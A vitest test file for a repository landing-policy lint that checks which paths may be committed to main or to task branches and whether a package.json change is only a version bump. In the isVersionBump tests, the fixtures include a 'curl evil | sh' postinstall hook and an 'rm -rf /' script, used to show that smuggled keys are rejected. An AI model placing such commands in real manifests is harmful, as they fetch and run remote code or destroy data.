import { describe, expect, it } from "vitest";
import { checkLanding, isVersionBump } from "./lint-landing.js";

const onMain = (...paths: string[]) => checkLanding("main", paths);
const onTask = (...paths: string[]) => checkLanding("task/0040-rules-are-executed", paths);

describe("checkLanding on main", () => {
  it("refuses implementation directories", () => {
    for (const path of [
      "src/index.ts",
      "tests/helpers/fs.ts",
      "docs/commands.md",
      "scripts/lint-widths.ts",
      ".github/workflows/ci.yml",
      ".husky/pre-commit",
      ".claude/settings.json",
    ]) {
      expect(onMain(path), path).toHaveLength(1);
    }
  });

  it("refuses the manifest, the lockfile and the installers", () => {
    expect(onMain("package.json", "bun.lock", "install.sh", "install.ps1")).toHaveLength(4);
  });

  it("allows the records, which go straight to main", () => {
    expect(onMain("decisions/0047-rules-are-executed.md", "decisions/README.md")).toEqual([]);
    expect(onMain("tasks/0040-x.md", "tasks/README.md", "tasks/archive/0039-y.md")).toEqual([]);
  });

  it("names the branch to use", () => {
    expect(onMain("src/index.ts")[0]?.message).toContain("task/00NN-slug");
  });

  it("says nothing about the root CLAUDE.md, which 0047 §5 does not name", () => {
    expect(onMain("CLAUDE.md")).toEqual([]);
  });

  it("refuses the root README.md, which 0033 §1 does name", () => {
    expect(onMain("README.md")).toHaveLength(1);
  });
});

const manifest = (extra: Record<string, unknown> = {}, version = "0.9.0") =>
  JSON.stringify({ name: "gdrive-cli", version, scripts: { test: "vitest run" }, ...extra });

describe("a release commit, which 0033's Out of scope exempts", () => {
  const head = manifest();
  const bumped = manifest({}, "0.10.0");

  it("lets a version bump through on main", () => {
    const context = { stagedPackageJson: bumped, headPackageJson: head };
    expect(checkLanding("main", ["package.json"], context)).toEqual([]);
  });

  it("still refuses package.json when another key changed too", () => {
    const context = {
      stagedPackageJson: manifest({ files: ["dist"] }, "0.10.0"),
      headPackageJson: head,
    };
    expect(checkLanding("main", ["package.json"], context)).toHaveLength(1);
  });

  it("does not extend the exemption to the rest of the commit", () => {
    const context = { stagedPackageJson: bumped, headPackageJson: head };
    const found = checkLanding("main", ["package.json", "src/index.ts"], context);
    expect(found.map((f) => f.path)).toEqual(["src/index.ts"]);
  });

  it("fails closed when either side is missing", () => {
    expect(checkLanding("main", ["package.json"])).toHaveLength(1);
    expect(
      checkLanding("main", ["package.json"], { stagedPackageJson: bumped, headPackageJson: null }),
    ).toHaveLength(1);
  });
});

describe("isVersionBump", () => {
  const head = manifest();

  it("is true when version alone changed", () => {
    expect(isVersionBump(manifest({}, "0.10.0"), head)).toBe(true);
  });

  it("is false when a second key rides along, however it is laid out", () => {
    expect(isVersionBump(manifest({ postinstall: "curl evil | sh" }, "0.10.0"), head)).toBe(false);
    expect(isVersionBump(manifest({ files: ["dist"] }, "0.10.0"), head)).toBe(false);
  });

  it("is false when a nested value changed and version did not", () => {
    expect(isVersionBump(manifest({ scripts: { test: "rm -rf /" } }), head)).toBe(false);
  });

  it("is false when version is deleted rather than set", () => {
    const without = JSON.stringify({ name: "gdrive-cli", scripts: { test: "vitest run" } });
    expect(isVersionBump(without, head)).toBe(false);
  });

  it("is false when nothing changed", () => {
    expect(isVersionBump(head, head)).toBe(false);
  });

  it("is false for null, for unparseable JSON and for a non-object", () => {
    expect(isVersionBump(null, head)).toBe(false);
    expect(isVersionBump(manifest({}, "0.10.0"), null)).toBe(false);
    expect(isVersionBump("{ not json", head)).toBe(false);
    expect(isVersionBump("[]", head)).toBe(false);
  });
});

describe("checkLanding on a task branch", () => {
  it("refuses a record, which is the phantom that cost #16 a review round", () => {
    expect(onTask("decisions/0047-x.md")).toHaveLength(1);
    expect(onTask("tasks/README.md")).toHaveLength(1);
    expect(onTask("tasks/archive/0039-y.md")).toHaveLength(1);
  });

  it("cites the record that explains why", () => {
    expect(onTask("tasks/README.md")[0]?.message).toContain("0044");
  });

  it("allows everything that lands through review", () => {
    expect(onTask("src/index.ts", "package.json", ".husky/pre-commit", "CLAUDE.md")).toEqual([]);
  });
});

describe("a directory CLAUDE.md, which is not a record", () => {
  it("lands on a task branch even though it sits under decisions/", () => {
    expect(onTask("decisions/CLAUDE.md", "tasks/CLAUDE.md", "src/CLAUDE.md")).toEqual([]);
  });

  it("is refused on main, opposite to the decision file beside it", () => {
    expect(onMain("decisions/CLAUDE.md")).toHaveLength(1);
    expect(onMain("decisions/0047-x.md")).toEqual([]);
  });
});

describe("any other branch", () => {
  it("has no policy, because 0033 §1 states none", () => {
    expect(checkLanding("fix/typo", ["src/index.ts", "decisions/0047-x.md"])).toEqual([]);
    expect(checkLanding("HEAD", ["src/index.ts"])).toEqual([]);
  });
});
